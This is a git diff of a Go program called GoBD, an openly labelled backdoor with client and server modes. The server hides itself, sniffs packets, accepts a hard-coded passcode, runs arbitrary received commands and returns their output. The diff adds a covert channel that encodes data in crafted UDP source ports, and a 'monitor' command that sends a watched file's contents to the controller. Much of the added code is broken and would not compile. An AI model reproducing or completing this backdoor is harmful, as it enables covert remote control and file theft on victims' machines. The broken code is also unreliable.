@@ -27,16 +27,16 @@ USAGE:
 */
 import(
 	"os"
+	"bytes"
 	"os/exec"
 	"reflect"
 	"unsafe"
 	"flag"
+	"encoding/binary"
 	"fmt"
 	"strings"
 	"strconv"
-	"io"
 	"bufio"
-	"log"
 	"github.com/google/gopacket/layers"
 	"golang.org/x/crypto/ssh/terminal"
 	"runtime"
@@ -45,12 +45,16 @@ import(
 	"net"
 )
 
-const passwd = "DAMNPANDIMENSIONALMICE"; //The authentication code
+const passwd = "D"; //The authentication code
+const MAX_PORT = 45535
+const CLIENT = 1
+const SERVER = 0
+const helpStr = "Client Usage Help\n" +"=================================\n" +
+"EXEC Commands\nSending any command will result in it being executed by the backdoor at the other end.\n" +
+"Once the command is sent, you will recieve the output back from the backdoor.\n============\nBD Commands\n" + "These commands are prefixed by a ! and are executed on the backdoors own program options\n!setprocess [name]\n" + "==================================\n"
 
-var (
-	authenticatedAddr string; //Currently authenticated address
-	handle *pcap.Handle
-)
+var authenticatedAddr string //Currently authenticated address
+var handle *pcap.Handle
 /* 
     FUNCTION: func main()
     RETURNS: Nothing
@@ -60,57 +64,56 @@ var (
 */
 func main(){
 
-	SetProcessName("dnsp");
+	//SetProcessName("dnsp")
 
 	//flags
 	modePtr      := flag.String("mode", "client", "The mode of the application, may either be" +
-		         " client or server. Defaults to client.");
-	ipPtr        := flag.String("ip", "127.0.0.1", "The ip to connect to if in client mode.");
-	portPtr      := flag.Int("port", 3322, "The port to connect to in client mode, or to listen on in server mode. Defaults to 3322.");
-	interfacePtr := flag.String("iface", "eth0", "The interface for the backdoor to monitor for incoming connection, defaults to eth0.");
-	lPortPtr     := flag.Int("lport", 3321, "The port for the client to listen on.");
-	hiddenPtr    := flag.String("visible", "false", "Determines whether the server will be hidden or not. true for visible and false for invisible.");
+		         " client or server. Defaults to client.")
+	ipPtr        := flag.String("ip", "127.0.0.1", "The ip to connect to if in client mode.")
+	portPtr      := flag.Int("port", 3322, "The port to connect to in client mode, or to listen on in server mode. Defaults to 3322.")
+	interfacePtr := flag.String("iface", "eth0", "The interface for the backdoor to monitor for incoming connection, defaults to eth0.")
+	lPortPtr     := flag.Int("lport", 3321, "The port for the client to listen on.")
+	hiddenPtr    := flag.String("visible", "false", "Determines whether the server will be hidden or not. true for visible and false for invisible.")
 	//flags
 
-	flag.Parse();
+	flag.Parse()
 	
 	if *hiddenPtr == "false" && *modePtr == "server" {
 
 		var procAttr os.ProcAttr 
 		procAttr.Files = []*os.File{os.Stdin, nil, nil} 
 		
-		arguments := make([]string, 7);
-		arguments[0] = "";
-		arguments[1] = fmt.Sprintf("-mode=%s", *modePtr);
-		arguments[2] = fmt.Sprintf("-ip=%s", *ipPtr);
-		arguments[3] = fmt.Sprintf("-port=%d", *portPtr);
-		arguments[4] = fmt.Sprintf("-iface=%s", *interfacePtr);
-		arguments[5] = fmt.Sprintf("-lport=%d", *lPortPtr);
-		arguments[6] = fmt.Sprint("-visible=invalid");
+		arguments := make([]string, 7)
+		arguments[0] = ""
+		arguments[1] = fmt.Sprintf("-mode=%s", *modePtr)
+		arguments[2] = fmt.Sprintf("-ip=%s", *ipPtr)
+		arguments[3] = fmt.Sprintf("-port=%d", *portPtr)
+		arguments[4] = fmt.Sprintf("-iface=%s", *interfacePtr)
+		arguments[5] = fmt.Sprintf("-lport=%d", *lPortPtr)
+		arguments[6] = fmt.Sprint("-visible=invalid")
 		if runtime.GOOS == "windows"{
 			_, err := os.StartProcess("GoBD", arguments, &procAttr)
-			checkError(err);
+			checkError(err)
 		} else {
-			_, err := os.StartProcess("./GoBD", arguments, &procAttr);
-			checkError(err);
+			_, err := os.StartProcess("./GoBD", arguments, &procAttr)
+			checkError(err)
 		}
-		return;
+		return
 	}
 
-	intiateTools();
+	intiateTools()
 	
-	handle, err := pcap.OpenLive(iface, 1600, true, pcap.BlockForever);
-	checkError(err);
+	handle, err := pcap.OpenLive(*interfacePtr, 1600, true, pcap.BlockForever)
+	checkError(err)
 
-	
 	switch *modePtr {
 	case "client":
-		fmt.Printf("Running in client mode. Connecting to %s at port %d.\n", *ipPtr, *portPtr);
-		intiateClient(*ipPtr, *portPtr, *lPortPtr);
-		break;
+		fmt.Printf("Running in client mode. Connecting to %s at port %d.\n", *ipPtr, *portPtr)
+		intiateClient(*ipPtr, *portPtr, *lPortPtr)
+		break
 	case "server":
-		fmt.Printf("Running in server mode. Listening on %s at port %d\n", GetLocalIP(), *portPtr);
-		intiateServer(*interfacePtr, *portPtr, *lPortPtr);
+		fmt.Printf("Running in server mode. Listening on %s at port %d\n", GetLocalIP(), *portPtr)
+		beginServerListen(*portPtr, *lPortPtr)
 	}
 }
 /* 
@@ -149,14 +152,8 @@ func intiateClient(ip string, port, lport int){
 	fmt.Printf("Authentication accepted, you may now send commands.\n");
 	fmt.Printf("Type ?help for more info on sending client commands.\n");
 
-	serverAddr,err := net.ResolveUDPAddr("udp", ":" + strconv.Itoa(lport));
-	checkError(err);
-
-	serverConn, err := net.ListenUDP("udp", serverAddr);
-	checkError(err);
+	go beginClientListen(ip, port, lport)
 	
-	defer serverConn.Close()
-
 	for {
 		reader := bufio.NewReader(os.Stdin);
 		input, _ := reader.ReadString('\n');
@@ -164,49 +161,11 @@ func intiateClient(ip string, port, lport int){
 		if strings.HasPrefix(input, "!") {
 			sendEncryptedData(port, "[BD]" + input, ip);
 		} else if input == "?help" {
-			fmt.Printf("Client Usage Help\n" +
-				"=================================\n" +
-				"EXEC Commands\n" +
-				"Sending any command will result in it being executed by the backdoor at the other end.\n" +
-				"Once the command is sent, you will recieve the output back from the backdoor.\n" +
-				"============\n" + 
-				"BD Commands\n" +
-				"These commands are prefixed by a ! and are executed on the backdoors own program options\n" +
-				"!setprocess [name]\n" +
-				"==================================\n");
+			fmt.Print(helpStr);
 			continue;
 		} else {
 			sendEncryptedData(port, "[EXEC]" + input, ip);
 		}
-		
-		grabOutput(serverConn);
-	}
-}
-/* 
-    FUNCTION: grabOutput(serverConn *net.UDPConn)
-    RETURNS: Nothing
-    ARGUMENTS: 
-                serverConn *net.UDPConn - A pointer to the server listening connection.
-
-    ABOUT:
-    Retrieves incoming data from UDP. Assumes no text will be greater than the maximum UDP size.
-*/
-func grabOutput(serverConn *net.UDPConn) {
-	
-	buf := make([]byte, 65536);
-	for {
-		n,_,err := serverConn.ReadFromUDP(buf)
-		if err != nil {
-			fmt.Println("Error: ", err)
-		}
-
-		data := decrypt_data(buf[0:n]);
-		
-		if strings.HasSuffix(data, "[END]"){
-			fmt.Printf("%s", data[0:(n-5)]);
-			break;
-		}
-		fmt.Printf("%s", data);
 	}
 }
 /* 
@@ -220,54 +179,125 @@ func grabOutput(serverConn *net.UDPConn) {
     ABOUT:
     Performs packet sniffing using gopacket (libpcap). 
 */
-func intiateServer(iface string, port, lport int){
+func beginServerListen(port, lport int){
 
 	var ipLayer layers.IPv4
 	var ethLayer layers.Ethernet
-
-	parser = gopacket.NewDecodingLayerParser(layers.LayerTypeEthernet, &ethLayer, &ipLayer)
-	decoded := []gopacket.LayerType{}
+	var udpLayer layers.UDP
+	var data []byte
+	
+	i := 0
+	pCount := 0
+	size := make([]byte, 4)
+	
+	parser := gopacket.NewDecodingLayerParser(layers.LayerTypeEthernet, &ethLayer, &ipLayer, &udpLayer)
+	decoded := make([]gopacket.LayerType, 0, 3);
 	
 	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
 	for {
 		packet, err := packetSource.NextPacket() 
 		checkError(err);
 
-		err := parser.DecodeLayers(packet, &decoded)
+		err = parser.DecodeLayers(packet.Data(), &decoded)
+		checkError(err);
+		
+		if ipLayer.SrcIP.String() == authenticatedAddr {
 
-		if ipLayer.Protocol == layers.IPProtocolUDP
-		handlePacket(ipLayer.(*layers.IPv4), udpLayer.(*layers.UDP), port, lport);
-	
-	}
+			buf := make([]byte, 2)
+			binary.LittleEndian.PutUint16(buf, uint16(udpLayer.SrcPort))
+			
+			if pCount < 2 {
+				tempSlice := size[i:i+1]
+				copy(tempSlice, buf)
+				pCount = pCount + 1
+				i = i + 2
+				continue;
+			}
+
+			if pCount >= 2 {
+				tempSlice := data[i:i+1]
+				copy(data[i:i+1], buf)
+				pCount = pCount + 1
+				i = i + 2
+				continue
+			}
+
+			var num uint32
+			err := binary.Read(bytes.NewBuffer(size[:]), binary.LittleEndian, &num)
+			checkError(err)
+			if pCount == num / uint32(2) {
+				pCount = 0
+				i = 0
+
+				data := decrypt_data(data)
+
+				if strings.HasPrefix(data, "[EXEC]") {
+					executeCommand(data, ipLayer.SrcIP.String(), port);
+				}
+				if strings.HasPrefix(data, "[BD]") {
+					executeServerCommand(data, ipLayer.SrcIP.String(), port);
+				}
+
+			}
+		} else if udpLayer.DstPort == lport {
+			
+			data := decrypt_data([]byte(udpLayer.Payload))
+
+			if data == passwd {
+				fmt.Printf("Authcode recieved, opening communication with %s\n", ipLayer.SrcIP.String());
+				authenticatedAddr = ipLayer.SrcIP.String();
+			}
+		}
+	}			
 }
-/* 
-    FUNCTION: handlePacket(ipLayer *layers.IPv4, udpLayer *layers.UDP, port, lport int){
-    RETURNS: Nothing
-    ARGUMENTS: 
-                *layers.IPv4 ipLayer - the ip part of the packet recieved
-                *layers.UDP udpLayer - the udp part of the packet recieved
-                  int port : port to send data to
-                  int lport : port to listen for data on
+func beginClientListen(ip string, port, lport int) {
+	var ipLayer layers.IPv4
+	var ethLayer layers.Ethernet
+	var udpLayer layers.UDP
+	var data []byte
 
-    ABOUT:
-    Performs packet sniffing using gopacket (libpcap). 
-*/
-func handlePacket(ipLayer *layers.IPv4, udpLayer *layers.UDP, port, lport int){
+	i := 0
+	pCount := 0
+	currSize := make([]byte, 4)
+	localip := GetLocalHost();
+
+	parser = gopacket.NewDecodingLayerParser(layers.LayerTypeEthernet, &ethLayer, &ipLayer, &udpLayer)
+	decoded := make([]gopacket.LayerType, 0, 3);
 	
-	if authenticatedAddr == ipLayer.SrcIP.String() {
-		data := decrypt_data([]byte(udpLayer.Payload));
-		if strings.HasPrefix(data, "[EXEC]") {
-			executeCommand(data, ipLayer.SrcIP.String(), port);
-		}
-		if strings.HasPrefix(data, "[BD]") {
-			executeServerCommand(data, ipLayer.SrcIP.String(), port);
-		}
+	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
+	for {
+		packet, err := packetSource.NextPacket() 
+		checkError(err);
 
-	}else if lport == int(udpLayer.DstPort) {
-		data := decrypt_data([]byte(udpLayer.Payload));
-		if data == passwd {
-			fmt.Printf("Authcode recieved, opening communication with %s\n", ipLayer.SrcIP);
-			authenticatedAddr = ipLayer.SrcIP.String();
+		err = parser.DecodeLayers(packet, &decoded)
+		checkError(err);
+
+		if ipLayer.SrcIP.String() == ip && udpLayer.DstPort == lport {
+
+			buf := make([]byte, 2)
+			binary.LittleEndian.PutUint16(buf, uint16(udpLayer.SrcPort))
+			
+			if pCount < 2 {
+				tempSlice := size[i:i+1]
+				copy(tempSlice, buf)
+				pCount = pCount + 1
+				i = i + 2
+				continue;
+			}
+
+			if pCount >= 2 {
+				tempSlice := data[i:i+1]
+				copy(data[i:i+1], buf)
+				pCount = pCount + 1
+				i = i + 2
+			}
+			
+			if pCount == (strconv.ParseInt(size, 10, 32))/2 {
+				pCount = 0
+				i = 0
+				data := decrypt_data([]byte(data))
+				fmt.Print(data);
+			}
 		}
 	}
 }
@@ -303,9 +333,14 @@ func executeServerCommand(data, ip string, port int) {
 			out = fmt.Sprintf("Process name set to %s\n", args[1]);
 		}
 		break;
+		
+	case "monitor":
+		sendEncryptedData(port, "Monitoring for requested file\n", ip);
+		go monitorFile(ip, args[1]);
+		break;
 
 	case "exit" :
-		sendEncryptedData(port, "Server exiting...\n[END]", ip);
+		sendEncryptedData(port, "Server exiting...\n", ip);
 		os.Exit(0);
 		break;
 
@@ -315,7 +350,25 @@ func executeServerCommand(data, ip string, port int) {
 
 	fmt.Printf("%s", out);
 
-	sendEncryptedData(port, out + "[END]", ip);	
+	sendEncryptedData(port, out, ip);	
+}
+
+func monitorFile(ip, filename string){
+
+	for {
+		time.Sleep(1000 * time.Millasecond);
+		err := os.Stat(filename)
+		if os.IsNotExist(err) {
+			continue;
+		}
+		
+		dat, err := ioutil.ReadFile(filename);
+		checkError(err);
+
+		//+1 to the port notifies that its a file transfer
+		sendEncryptedFile(port + 1, string(dat), ip);
+		return;
+	}
 }
 /* 
     FUNCTION: func  executeCommand(cmd, ip string, port int) 
@@ -336,10 +389,10 @@ func executeCommand(cmd, ip string, port int){
 	args := strings.Split(tempstr[1], " ");
 	
 	out, _ := exec.Command(args[0], args[1:]...).CombinedOutput();
-	
+	k
 	fmt.Printf("OUT:\n%s", out);
 
-	sendEncryptedData(port, string(out[:]) + "[END]", ip);
+	sendEncryptedData(port, string(out[:]), ip);
 }
 /* 
     FUNCTION: sendEncryptedData(port int, data, ip string)
@@ -352,12 +405,66 @@ func executeCommand(cmd, ip string, port int){
     Sends encrypted data over UDP to the spcified port and ip.
 */
 func sendEncryptedData(port int, data, ip string) {
-	conn, err := net.ListenUDP("udp", &net.UDPAddr{IP: net.IPv4zero, Port: 0})
-	checkError(err);
+
+	size := len(data)
+	buf := make([]byte, 4)
+	err := binary.Write(buf, binary.LittleEndian, size)
+	if err != nil {
+		fmt.Println("binary.Write failed:", err)
+	}
 	
-	cryptdata := encrypt_data(data);
-	_, err = conn.WriteToUDP([]byte(cryptdata), &net.UDPAddr{IP: net.ParseIP(ip), Port: port})
+	cryptdata := encrypt_data(data)
+
+	buffer := craftPacket(buf[0:1], ip, port)
+	err = handle.WritePacketData(buffer)
+	checkError(err)
+
+	buffer = craftPacket(buf[2:3], ip, port)
+	err = handle.WritePacketData(buffer)
+	checkError(err)
+	
+	//make data write to source port, continue till end
+	for i := 0; i < size; i = i + 2 {
+
+		buffer := craftPacket(cryptdata[i:(i+1)], ip, port);
+
+		if buffer == nil { // if original query was invalid
+			fmt.Print("Buffer error, returned nil.\n")
+			continue
+		}
+
+		err = handle.WritePacketData(buffer);
+		checkError(err);
+	}
+}
+
+func craftPacket(data, ip string, port int) []byte {
+
+	ethernetLayer = packet.Layer(layers.LayerTypeEthernet)
+	ipLayer = packet.Layer(layers.LayerTypeIPv4)
+	udpLayer = packet.Layer(layers.LayerTypeUDP)
+	
+	ipAddr, _, err = net.ParseCIDR(ip)
+	checkError(err)
+	
+	ipLayer.SrcIP = GetLocalIP()
+	ipLayer.DstIP = ipAddr
+
+	udpLayer.SrcPort = MAX_PORT - strconv.ParseUint(data, 10, 16)
+	udpLayer.DstPort = port
+	err = udpLayer.SetNetworkLayerForChecksum(ipLayer)
+	checkError(err)
+	
+	buf := gopacket.NewSerializeBuffer();
+	opts := gopacket.SerializeOptions{
+		FixLengths: true,
+		ComputeChecksums: true,
+	};
+
+	err = gopacket.SerializeLayers(buf, opts, ethernetLayer, ipLayer, udpLayer);
 	checkError(err);
+
+	return buf.Bytes()
 }
 ///Utility Functions//////////////////////////////////////////
 /* 
